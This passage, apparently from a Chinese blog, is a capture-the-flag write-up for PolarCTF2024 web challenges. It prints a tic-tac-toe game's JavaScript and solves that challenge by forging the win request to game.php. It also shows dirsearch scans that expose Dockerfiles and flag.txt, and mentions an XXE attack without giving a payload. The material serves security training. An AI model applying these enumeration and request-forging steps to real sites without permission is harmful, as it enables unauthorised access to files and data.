class="string">&#x27;F5&#x27;</span> || event.<span class="property">key</span> === <span class="string">&#x27;F12&#x27;</span> || event.<span class="property">key</span> === <span class="string">&#x27;F11&#x27;</span>) &#123;</span><br><span class="line">        event.<span class="title function_">preventDefault</span>();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>给具体的get请求了<code>/proxy.php?file=flag</code>，直接构造请求就行了</p>
+<h1 id="井字棋"><a href="#井字棋" class="headerlink" title="井字棋"></a>井字棋</h1><h2 id="前端js-1"><a href="#前端js-1" class="headerlink" title="#前端js"></a>#前端js</h2><p>还是一样，这种前端的直接看js</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">let</span> origBoard;</span><br><span class="line"><span class="keyword">let</span> huPlayer = <span class="string">&#x27;O&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> aiPlayer = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> winCombos = [</span><br><span class="line">    [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>],</span><br><span class="line">    [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>],</span><br><span class="line">    [<span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">4</span>, <span class="number">8</span>],</span><br><span class="line">    [<span class="number">6</span>, <span class="number">4</span>, <span class="number">2</span>],</span><br><span class="line">    [<span class="number">2</span>, <span class="number">5</span>, <span class="number">8</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>]</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cells = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.cell&#x27;</span>);</span><br><span class="line"><span class="title function_">startGame</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">selectSym</span>(<span class="params">sym</span>) &#123;</span><br><span class="line">    huPlayer = sym;</span><br><span class="line">    aiPlayer = sym === <span class="string">&#x27;O&#x27;</span> ? <span class="string">&#x27;X&#x27;</span> : <span class="string">&#x27;O&#x27;</span>;</span><br><span class="line">    origBoard = <span class="title class_">Array</span>.<span class="title function_">from</span>(<span class="title class_">Array</span>(<span class="number">9</span>).<span class="title function_">keys</span>());</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; cells.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        cells[i].<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, turnClick, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (aiPlayer === <span class="string">&#x27;X&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_">turn</span>(<span class="title function_">bestSpot</span>(), aiPlayer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.selectSym&#x27;</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;none&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">startGame</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.endgame&#x27;</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;none&quot;</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.endgame .text&#x27;</span>).<span class="property">innerText</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.selectSym&#x27;</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;block&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; cells.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        cells[i].<span class="property">innerText</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        cells[i].<span class="property">style</span>.<span class="title function_">removeProperty</span>(<span class="string">&#x27;background-color&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">turnClick</span>(<span class="params">square</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> origBoard[square.<span class="property">target</span>.<span class="property">id</span>] === <span class="string">&#x27;number&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_">turn</span>(square.<span class="property">target</span>.<span class="property">id</span>, huPlayer);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_">checkWin</span>(origBoard, huPlayer) &amp;&amp; !<span class="title function_">checkTie</span>())</span><br><span class="line">            <span class="title function_">turn</span>(<span class="title function_">bestSpot</span>(), aiPlayer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">turn</span>(<span class="params">squareId, player</span>) &#123;</span><br><span class="line">    origBoard[squareId] = player;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(squareId).<span class="property">innerHTML</span> = player;</span><br><span class="line">    <span class="keyword">let</span> gameWon = <span class="title function_">checkWin</span>(origBoard, player);</span><br><span class="line">    <span class="keyword">if</span> (gameWon) <span class="title function_">gameOver</span>(gameWon);</span><br><span class="line">    <span class="title function_">checkTie</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkWin</span>(<span class="params">board, player</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> plays = board.<span class="title function_">reduce</span>(<span class="function">(<span class="params">a, e, i</span>) =&gt;</span> (e === player) ? a.<span class="title function_">concat</span>(i) : a, []);</span><br><span class="line">    <span class="keyword">let</span> gameWon = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> [index, win] <span class="keyword">of</span> winCombos.<span class="title function_">entries</span>()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (win.<span class="title function_">every</span>(<span class="function"><span class="params">elem</span> =&gt;</span> plays.<span class="title function_">indexOf</span>(elem) &gt; -<span class="number">1</span>)) &#123;</span><br><span class="line">            gameWon = &#123;</span><br><span class="line">                <span class="attr">index</span>: index,</span><br><span class="line">                <span class="attr">player</span>: player</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> gameWon;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">gameOver</span>(<span class="params">gameWon</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> index <span class="keyword">of</span> winCombos[gameWon.<span class="property">index</span>]) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(index).<span class="property">style</span>.<span class="property">backgroundColor</span> =</span><br><span class="line">            gameWon.<span class="property">player</span> === huPlayer ? <span class="string">&quot;#0099ff&quot;</span> : <span class="string">&quot;#f4001f&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; cells.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        cells[i].<span class="title function_">removeEventListener</span>(<span class="string">&#x27;click&#x27;</span>, turnClick, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">declareWinner</span>(gameWon.<span class="property">player</span> === huPlayer ? <span class="string">&quot;您赢了！&quot;</span> : <span class="string">&quot;您输了.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">declareWinner</span>(<span class="params">who</span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;.endgame&quot;</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;block&quot;</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;.endgame .text&quot;</span>).<span class="property">innerText</span> = who;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 确定获胜状态并发送到后端</span></span><br><span class="line">    <span class="keyword">const</span> winner = who === <span class="string">&quot;您赢了！&quot;</span> ? <span class="string">&quot;player&quot;</span> : <span class="string">&quot;ai&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// AJAX 请求后端</span></span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&quot;game.php&quot;</span>, &#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        <span class="attr">headers</span>: &#123;</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">winner</span>: winner &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">json</span>())</span><br><span class="line">    .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (data.<span class="property">flag</span>) &#123;</span><br><span class="line">            <span class="comment">// 弹出 Flag</span></span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;Flag: &quot;</span> + data.<span class="property">flag</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (data.<span class="property">message</span>) &#123;</span><br><span class="line">            <span class="comment">// 显示提示</span></span><br><span class="line">            <span class="title function_">alert</span>(data.<span class="property">message</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Error:&quot;</span>, error);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">emptySquares</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> origBoard.<span class="title function_">filter</span>(<span class="function">(<span class="params">elm, i</span>) =&gt;</span> i === elm);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">bestSpot</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">minimax</span>(origBoard, aiPlayer).<span class="property">index</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkTie</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">emptySquares</span>().<span class="property">length</span> === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (cell <span class="keyword">of</span> cells) &#123;</span><br><span class="line">            cell.<span class="property">style</span>.<span class="property">backgroundColor</span> = <span class="string">&quot;green&quot;</span>;</span><br><span class="line">            cell.<span class="title function_">removeEventListener</span>(<span class="string">&#x27;click&#x27;</span>, turnClick, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_">declareWinner</span>(<span class="string">&quot;平局&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">minimax</span>(<span class="params">newBoard, player</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> availSpots = <span class="title function_">emptySquares</span>(newBoard);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">checkWin</span>(newBoard, huPlayer)) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">score</span>: -<span class="number">10</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_">checkWin</span>(newBoard, aiPlayer)) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">score</span>: <span class="number">10</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (availSpots.<span class="property">length</span> === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">score</span>: <span class="number">0</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> moves = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; availSpots.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> move = &#123;&#125;;</span><br><span class="line">        move.<span class="property">index</span> = newBoard[availSpots[i]];</span><br><span class="line">        newBoard[availSpots[i]] = player;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (player === aiPlayer)</span><br><span class="line">            move.<span class="property">score</span> = <span class="title function_">minimax</span>(newBoard, huPlayer).<span class="property">score</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            move.<span class="property">score</span> = <span class="title function_">minimax</span>(newBoard, aiPlayer).<span class="property">score</span>;</span><br><span class="line">        newBoard[availSpots[i]] = move.<span class="property">index</span>;</span><br><span class="line">        <span class="keyword">if</span> ((player === aiPlayer &amp;&amp; move.<span class="property">score</span> === <span class="number">10</span>) || (player === huPlayer &amp;&amp; move.<span class="property">score</span> === -<span class="number">10</span>))</span><br><span class="line">            <span class="keyword">return</span> move;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            moves.<span class="title function_">push</span>(move);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> bestMove, bestScore;</span><br><span class="line">    <span class="keyword">if</span> (player === aiPlayer) &#123;</span><br><span class="line">        bestScore = -<span class="number">1000</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; moves.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (moves[i].<span class="property">score</span> &gt; bestScore) &#123;</span><br><span class="line">                bestScore = moves[i].<span class="property">score</span>;</span><br><span class="line">                bestMove = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        bestScore = <span class="number">1000</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; moves.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (moves[i].<span class="property">score</span> &lt; bestScore) &#123;</span><br><span class="line">                bestScore = moves[i].<span class="property">score</span>;</span><br><span class="line">                bestMove = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> moves[bestMove];</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>找到flag的前置条件，直接按要求发送请求就行了</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 确定获胜状态并发送到后端</span><br><span class="line">    const winner = who === &quot;您赢了！&quot; ? &quot;player&quot; : &quot;ai&quot;;</span><br><span class="line">// AJAX 请求后端</span><br><span class="line">    fetch(&quot;game.php&quot;, &#123;</span><br><span class="line">        method: &quot;POST&quot;,</span><br><span class="line">        headers: &#123;</span><br><span class="line">            &quot;Content-Type&quot;: &quot;application/json&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        body: JSON.stringify(&#123; winner: winner &#125;)</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>
+
+<p>那就发呗，请求路径是game.php，请求体是json格式的winner键值对</p>
+<p><img src="/../image/achieve/202411/PolarCTF-web/image-20251211134127869.png" alt="image-20251211134127869"></p>
+<h1 id="xxmmll"><a href="#xxmmll" class="headerlink" title="xxmmll"></a>xxmmll</h1><h2 id="XXE"><a href="#XXE" class="headerlink" title="#XXE"></a>#XXE</h2><p>源码有一段注释代码</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--牢猫的网站使用 PHP 作为服务器端编程语言，是http响应头--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>用dirsearch扫一下目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[12:01:21] Scanning:</span><br><span class="line">[12:01:29] 200 -   469B - /Dockerfile</span><br><span class="line">[12:01:29] 200 -   654B - /docker-compose.yml</span><br><span class="line">[12:01:29] 200 -    11B - /flag.txt</span><br><span class="line">[12:01:30] 200 -   417B - /index.php</span><br><span class="line">[12:01:30] 200 -   417B - /index.php/login/</span><br><span class="line">[12:01:34] 403 -   342B - /server-status/</span><br><span class="line">[12:01:34] 403 -   341B - /server-status</span><br></pre></td></tr></table></figure>
+
+<p>有一个非预期解，flag在docker文件里面</p>
+<p><img src="/../image/achieve/202411/PolarCTF-web/image-20251212120329958.png" alt="image-20251212120329958"></p>
+<p>然后我们看看预期解，上面提示响应头</p>
+<p><img src="/../image/achieve/202411/PolarCTF-web/image-20251212120503677.png" alt="image-20251212120503677"></p>
+<p>访问一下是一个提交页面</p>
+<p><img src="/../image/achieve/202411/PolarCTF-web/image-20251212120650567.png" alt="image-20251212120650567"></p>
+<p>随便传进去出现xml解析错误，那就打xxe就行了</p>
+<p>后面发现随便传一个xml就可以通过验证了</p>
+<h1 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h1><p><img src="/../image/achieve/202411/PolarCTF-web/image-20251212120837468.png" alt="image-20251212120837468"></p>
+<p>dirsearch扫目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[12:08:53] Scanning:</span><br><span class="line">[12:09:01] 200 -    1KB - /debug.log</span><br><span class="line">[12:09:01] 200 -   774B - /Dockerfile</span><br><span class="line">[12:09:01] 200 -   180B - /docker-compose.yml</span><br><span class="line">[12:09:02] 200 -    39B - /flag.txt</span><br><span class="line">[12:09:03] 200 -   352B - /index.php</span><br><span class="line">[12:09:03] 200 -   352B - /index.php/login/</span><br><span class="line">[12:09:04] 200 -     0B - /logs.txt</span><br><span class="line">[12:09:07] 403 -   341B - /server-status</span><br><span class="line">[12:09:07] 403 -   342B - /server-status/</span><br></pre></td></tr></table></figure>
+
+<p>直接访问flag.txt就出来了</p>
+
+    </div>
+
+    
+    
+    
+	
+	<div>
+	  
+		
+<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+	  
+	</div>
+
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>wanTh3flag
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://wanth3f1ag.top/2025/12/11/PolarCTF2024%E5%86%AC%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/" title="PolarCTF2024冬季个人挑战赛web题解">https://wanth3f1ag.top/2025/12/11/PolarCTF2024冬季个人挑战赛web题解/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/PolarCTF2024%E5%86%AC%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B/" rel="tag"># PolarCTF2024冬季个人挑战赛</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/12/09/PolarCTF2025%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/" rel="prev" title="PolarCTF2025夏季个人挑战赛web题解">
+                  <i class="fa fa-angle-left"></i> PolarCTF2025夏季个人挑战赛web题解
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/12/12/jfinal-CMSv5-1-0-Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="next" title="jfinal CMSv5.1.0 Fastjson反序列化漏洞复现">
+                  jfinal CMSv5.1.0 Fastjson反序列化漏洞复现 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2024 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">wanTh3flag</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">3.2m</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">49:01</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
